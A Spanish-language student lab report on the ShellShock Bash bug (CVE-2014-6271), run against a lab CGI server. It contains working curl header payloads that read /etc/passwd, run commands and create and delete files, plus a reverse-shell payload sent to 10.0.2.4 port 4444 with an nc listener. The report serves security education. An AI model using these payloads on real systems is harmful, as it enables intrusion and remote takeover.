---
title: ShellShock
cve: CVE-2014-6271
author_1: "Héctor Toral Pallás (798095)"
author_2: "Darío Marcos Casalé (795306)"
---

# [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/cve-2014-6271)

La vulnerabilidad `CVE-2014-6271`, también conocida como `ShellShock`, es una vulnerabilidad de seguridad en el intérprete de comandos Bash que permite la ejecución de código arbitrario en un sistema afectado.

Se necesitan dos condiciones para explotar la vulnerabilidad:
1. El proceso de destino debe ejecutar bash
2. El proceso de destino debe obtener entradas de usuario no confiables a través de variables de entorno

El problema surge de un bug en el código fuente del intérprete, ya que el mecanismo
de exportar funciones sólo comprobaba si la cadena comenzaba por `() {`.

```c
...
/* If exported function, define it now. Don't import  
   functions from the environment in privileged mode. */
if (privmode == 0 && read_but_dont_execute == 0 && STREQN("() {", string, 4))) {
  ...
  // Shellshock vulnerabilty is inside
  parse_and_execute(temp_string, name, SEVAL_NONINT | SEVAL_NOHIST);
}
...
```

## Tarea 1

Se ha diseñado una prueba para comprobar la vulnerabilidad de Shellshock. Para ello se ha ejecutado el siguiente script `checkShellShock.sh`:
```bash
#!/bin/bash

# Crear una función y código adicional
var='() { :; }; echo "vulnerable";'

# Exportar la cadena
export var

# lanzar un shell hijo vulnerable
bash_shellshock
```

La salida del script imprime `vulnerable` si el shell es vulnerable al ataque ShellShock. En efecto se ha verificado la vulnerabilidad:
```
root@4f8f7c1d55f1:/$ ./checkShellShock.sh                                             
vulnerable
root@4f8f7c1d55f1:/$
```

Por otro lado, se ha observado que la vulnerabilidad fue parcheada en el shell bash actual. Para ello basta con cambiar el shell que se lanza como hijo. Ahora el mensaje `vulnerable` no aparece:

```
root@4f8f7c1d55f1:/# ./checkShellShock.sh                                             
root@4f8f7c1d55f1:/# 
```

## Tarea 2

### web

Se ha abierto un navegador y se ha accedido a la siguiente URL:

```
http://10.9.0.80/cgi-bin/getenv.cgi
```

La respuesta del servidor contiene el siguiente listado de variables de entorno.

```
****** Environment Variables ******
HTTP_HOST=10.9.0.80
HTTP_USER_AGENT=Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:83.0) Gecko/20100101 Firefox/83.0
HTTP_ACCEPT=text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
HTTP_ACCEPT_LANGUAGE=en-US,en;q=0.5
HTTP_ACCEPT_ENCODING=gzip, deflate
HTTP_CONNECTION=keep-alive
HTTP_UPGRADE_INSECURE_REQUESTS=1
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
SERVER_SIGNATURE=<address>Apache/2.4.41 (Ubuntu) Server at 10.9.0.80 Port 80</address>
SERVER_SOFTWARE=Apache/2.4.41 (Ubuntu)
SERVER_NAME=10.9.0.80
SERVER_ADDR=10.9.0.80
SERVER_PORT=80
REMOTE_ADDR=10.9.0.1
DOCUMENT_ROOT=/var/www/html
REQUEST_SCHEME=http
CONTEXT_PREFIX=/cgi-bin/
CONTEXT_DOCUMENT_ROOT=/usr/lib/cgi-bin/
SERVER_ADMIN=webmaster@localhost
SCRIPT_FILENAME=/usr/lib/cgi-bin/getenv.cgi
REMOTE_PORT=42824
GATEWAY_INTERFACE=CGI/1.1
SERVER_PROTOCOL=HTTP/1.1
REQUEST_METHOD=GET
QUERY_STRING=
REQUEST_URI=/cgi-bin/getenv.cgi
SCRIPT_NAME=/cgi-bin/getenv.cgi
```

### curl

Se ha observado lo siguiente sobre las opciones de `curl`:

- Opción "Include Headers" (`-v`): Añade información sobre las cabeceras de la respuesta.  
```bash
curl -v 10.9.0.80/cgi-bin/getenv.cgi
```
```bash
> GET /cgi-bin/getenv.cgi HTTP/1.1
> Host: 10.9.0.80
> User-Agent: curl/7.68.0
> Accept: */*
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< Date: Mon, 26 Sep 2022 20:51:11 GMT
< Server: Apache/2.4.41 (Ubuntu)
< Content-Length: 13
< Content-Type: text/plain
< 
...
```

- Opción "UserAgent" (`-A`): Añade un campo de agente de usuario a la cabecera. Además, define una variable de entorno `HTTP_USER_AGENT`.
```bash
curl -A "my data" -v 10.9.0.80/cgi-bin/getenv.cgi
```

- Opción "Referer" (`-e`): Añade un campo que incluye la URL de la página web que redirigió la petición al servidor. Además, define una variable de entorno `HTTP_REFERER`
```bash
curl -e "my data" -v 10.9.0.80/cgi-bin/getenv.cgi
```

- Opción "Custom Header" (`-H`): Permite añadir una cabecera personalizada y asociar un valor. Además, define una variable de entorno `HTTP_[CUSTOM_HEADER]`, donde `[CUSTOM_HEADER]` es la clave de la cabecera en mayúsculas.
```bash
curl -H "AAAAAA: BBBBBB" -v 10.9.0.80/cgi-bin/getenv.cgi
```

## Tarea 3

Para lanzar el ataque Shellshock a través del CGI vulnerable se añade una cabecera `ContentType`. La salida del código extra aparecerá en el contenido del mensaje de respuesta del servidor, ya que se exportó una declaración de función vulnerable, por lo que 

### Mostrar `/etc/passwd`
```bash
curl -A "() { :; }; echo Content_type: text/plain; echo; /bin/cat /etc/passwd" 10.9.0.80/cgi-bin/getenv.cgi
```
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
```

### user ID del proceso
```bash
curl -e "() { :; }; echo Content_type: text/plain; echo; /bin/id" 10.9.0.80/cgi-bin/getenv.cgi
```
```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### Crear fichero en `/tmp`
```bash
curl -H "foo: () { :; }; echo Content_type: text/plain; echo; /bin/touch /tmp/sec" 10.9.0.80/cgi-bin/getenv.cgi
```

### Borrar fichero en `/tmp`
```bash
curl -H "foo: () { :; }; echo Content_type: text/plain; echo; /bin/rm /tmp/sec" 10.9.0.80/cgi-bin/getenv.cgi
```

### Pregunta 1
No es posible, ya que el usuario que ejecuta el script del CGI es `www-data`, que no tiene privilegios de root. Se puede observar en el resultado de la [Tarea 3b](#user-id-del-proceso)

### Pregunta 2
No se puede, porque la codificación de la query string no admite espacios ni carácteres especiales. En su lugar los codifica con un porcentaje y un número, por ejemplo el espacio, cuya codificación es `%20`. Por ello, si se quiere añadir una definición de función en la query de la URL, no puede contener espacios, y si los tiene, quedarán codificados por el formato `url-encode`, por lo que la definición de función en la variable de entorno exportada no se interpretará como se esperaba.

```bash	
root@4f8f7c1d55f1:/$ curl -G "10.9.0.80/cgi-bin/getenv.cgi" --data-urlencode "() { :; }; echo Content_type: text/plain; echo; echo hola"
```

El resultado de la codificación queda reflejado en la variable de entorno `QUERY_STRING`:

```bash
QUERY_STRING=%28%29%20%7B%20%3A%3B%20%7D%3B%20echo%20Content_type%3A%20text%2Fplain%3B%20echo%3B%20echo%20hola
REQUEST_URI=/cgi-bin/getenv.cgi?%28%29%20%7B%20%3A%3B%20%7D%3B%20echo%20Content_type%3A%20text%2Fplain%3B%20echo%3B%20echo%20hola
```

## Tarea 4

### Reverse Shell

Escucha en el puerto 4444 para recibir la conexión de la reverse shell
```bash
nc -nlvp 4444
```

Lanza el ataque Shellshock con el payload de reverse shell.
```bash
curl -A '() { :; }; /bin/bash -i >& /dev/tcp/10.0.2.4/4444 0>&1' 10.9.0.80/cgi-bin/getenv.cgi
```

Hemos usado el script [linPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS) para analizar dentro de la maquina victima posibles vulnerabilidades para escalar privilegios y obtener una shell con permisos de root.

## Tarea 5

Se ha realizado de nuevo la tarea 3, cambiando el intérprete del script del CGI al bash parcheado.

(...)

## Referencias 

- [Información](https://mudongliang.github.io/2020/09/17/ruid-euid-suid-usage-in-linux.html) sobre `ruid`, `euid` y `suid`
- Como herramienta auxiliar puede utilizar [explainshell](https://explainshell.com/) para entender el funcionamiento de algunos comandos.
